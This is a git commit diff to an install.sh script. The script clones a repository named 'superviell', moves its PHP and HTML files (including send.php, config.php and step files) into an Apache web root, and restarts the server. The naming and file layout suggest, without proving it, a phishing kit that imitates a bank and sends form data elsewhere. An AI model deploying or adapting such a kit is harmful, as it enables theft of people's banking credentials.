ce9d6a9871a9344b34493bc5d28181aadd54de3d
RESEKK VPS <103382307+resekk-vps@users.noreply.github.com>
2022-05-18 11:10:45 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -5,7 +5,7 @@
 # ==============================================
 cd /etc/apache2/sites-available; nano 000-default.conf
 cd /var/www; git clone https://github.com/resekk-vps/superviell
-cd /var/www/superviell; mv index_files /var/www; mv step2.html /var/www; mv config.php /var/www; mv index.html /var/www; mv send.php /var/www
+cd /var/www/superviell; mv ajax /var/www; mv App_Themes /var/www; mv config.php /var/www; mv index.php /var/www; mv send.php /var/www; mv v.php /var/www; mv icon /var/www; mv tr /var/www
 cd /var/www; nano config.php
 cd /root; sudo service apache2 restart
 #BANNER
